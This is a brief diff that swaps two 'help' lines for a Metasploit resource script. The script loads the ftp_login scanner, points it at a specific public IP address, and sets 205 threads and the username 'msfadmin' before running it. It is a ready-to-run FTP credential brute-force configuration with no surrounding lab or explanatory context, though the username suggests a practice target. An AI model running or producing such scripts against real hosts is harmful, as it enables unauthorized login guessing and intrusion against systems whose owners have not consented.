@@ -1,2 +1,7 @@
-help
-help
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 34.228.81.134
+set THREADS 205
+set USERNAME msfadmin
+set VERBOSE false
+run
+exit
